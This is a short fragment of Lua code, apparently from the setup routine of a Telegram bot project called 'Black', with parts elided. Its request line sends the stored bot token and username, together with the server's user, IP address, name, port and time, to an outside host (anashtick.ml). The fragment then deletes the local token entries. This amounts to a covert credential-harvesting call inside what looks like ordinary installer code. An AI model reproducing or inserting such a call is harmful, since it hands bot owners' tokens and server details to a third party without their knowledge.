...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserName_Write"))   
local t = json:decode(https.request('https://anashtick.ml/info.php?id=BK&id='..database:get(Server_Done.."UserName_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
...
Files_Info_Get()
database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserName_Write")
